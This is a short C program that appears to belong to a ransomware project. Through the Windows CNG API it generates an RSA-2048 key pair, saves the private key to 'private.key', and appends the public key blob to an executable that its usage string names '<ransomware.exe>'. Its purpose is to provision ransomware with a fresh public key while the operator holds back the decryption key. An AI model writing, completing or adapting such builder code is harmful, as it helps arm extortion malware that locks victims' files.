#include "util.h"

/* Defnitions found in bcrypt.h | https://www.microsoft.com/en-us/download/details.aspx?id=30688 */
#define BCRYPT_RSA_ALGORITHM		 L"RSA"

#define BCRYPT_PUBLIC_KEY_BLOB       L"PUBLICBLOB"
#define BCRYPT_PRIVATE_KEY_BLOB      L"PRIVATEBLOB"

typedef PVOID BCRYPT_ALG_HANDLE;
typedef PVOID BCRYPT_KEY_HANDLE;

/* key to file */
void
ktof(HINSTANCE *hinst, BCRYPT_KEY_HANDLE *hkey, short unsigned int *blobtype, const char *filename, const char *fmode)
{
	FILE *f;
	unsigned long keysize = 0;
	unsigned char *keyblob;

	/* BCryptExportKey */
	if (adrof(*hinst, "BCryptExportKey")(*hkey, 0, blobtype, 0, 0, &keysize, 0))
		die("Failed to call BCryptExportKey");
	
	if (!(keyblob = malloc(keysize)))
		die("Failed to malloc privkey");
	/* BCryptExportKey */
	if (adrof(*hinst, "BCryptExportKey")(*hkey, 0, blobtype, keyblob, keysize, &keysize, 0))
		die("Failed to call BCryptExportKey");
	/* Write to file */
	if (!(f = fopen(filename, fmode)))
		die("Failed to fopen");
	if (!fwrite(keyblob, 1, keysize, f))
		die("Failed to fwrite");
	fclose(f);
	free(keyblob);

	printf("Wrote %lu bytes to %s\n", keysize, filename);
}

int
main(int argc, char **argv)
{
	if (argc < 2) {
		fprintf(stderr, "usage: %s <ransomware.exe>", argv[0]);
		return 1;
	}

	HINSTANCE hinst;
	FARPROC func;
	BCRYPT_ALG_HANDLE alghandle = 0;
	BCRYPT_KEY_HANDLE hkey = 0;

	if (!(hinst = LoadLibrary("bcrypt.dll")))
		die("Failed to load bcrypt.dll");
	/* BCryptOpenAlgorithmProvider */
	if (adrof(hinst,"BCryptOpenAlgorithmProvider")(&alghandle, BCRYPT_RSA_ALGORITHM, 0, 0))
		die("Failed call to BCryptOpenAlgorithmProvider");
	/* BCryptGenerateKeyPair */
	if (adrof(hinst, "BCryptGenerateKeyPair")(alghandle, &hkey, 2048, 0))
		die("Failed call to BCryptGenerateKeyPair");
	/* BCryptFinalizeKeyPair */
	if (adrof(hinst, "BCryptFinalizeKeyPair")(hkey, 0))
		die("Failed call to BCryptFinalizeKeyPair");
	/* Write private key to file */
	ktof(&hinst, &hkey, BCRYPT_PRIVATE_KEY_BLOB, "private.key", "wb");
	ktof(&hinst, &hkey, BCRYPT_PUBLIC_KEY_BLOB, argv[1], "ab");
	/* BCryptCloseAlgorithmProvider */
	adrof(hinst, "BCryptCloseAlgorithmProvider")(alghandle, 0);

	FreeLibrary(hinst);
}

